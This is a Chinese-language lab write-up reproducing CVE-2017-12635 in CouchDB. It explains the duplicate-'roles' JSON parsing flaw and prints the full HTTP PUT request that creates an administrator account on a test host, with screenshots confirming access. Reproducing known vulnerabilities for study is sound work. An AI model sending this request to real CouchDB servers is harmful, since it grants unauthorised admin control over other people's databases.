**CouchDB** 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON)
API 访问。术语 “Couch” 是 “Cluster Of Unreliable Commodity Hardware” 的首字母缩写，它反映了
CouchDB 的目标具有高度可伸缩性，提供了高可用性和高可靠性，即使运行在容易出现故障的硬件上也是如此。

CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

本文仅作漏洞复现记录与实现，利用流程如下:

## 一、漏洞环境

目标链接：http://192.168.101.152:5984/

直接访问是这样子的

![1616239693_6055dc4d4bddc9fe5a73d.png!small](https://image.3001.net/images/20210320/1616239693_6055dc4d4bddc9fe5a73d.png!small)

访问http://192.168.101.152:5984/_utils/后如下

![1616239720_6055dc68c1096d3d51e98.png!small](https://image.3001.net/images/20210320/1616239720_6055dc68c1096d3d51e98.png!small)

直接点击_users会提示无权访问数据库

![1616239755_6055dc8b6bfec97efc36d.png!small](https://image.3001.net/images/20210320/1616239755_6055dc8b6bfec97efc36d.png!small)

## 二、利用流程

首先发送第一个数据包，会提示403错误，提示只有管理员可以设置角色

![1616239874_6055dd0242b09ee11a6c3.png!small](https://image.3001.net/images/20210320/1616239874_6055dd0242b09ee11a6c3.png!small)

但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为vulhub的管理员账户

    
    
    PUT /_users/org.couchdb.user:vulhub HTTP/1.1
    Host: 192.168.101.152:5984
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 108
    
    {
    "type": "user",
    "name": "vulhub",
    "roles": ["_admin"],
    "roles": [],
    "password": "vulhub"
    }

![1616239972_6055dd646a8335d532b38.png!small](https://image.3001.net/images/20210320/1616239972_6055dd646a8335d532b38.png!small)

再回到前台登录，已经可以访问了

![1616240019_6055dd93359e901ac402c.png!small](https://image.3001.net/images/20210320/1616240019_6055dd93359e901ac402c.png!small)

![1616240051_6055ddb3c080ccae28ec1.png!small](https://image.3001.net/images/20210320/1616240051_6055ddb3c080ccae28ec1.png!small)

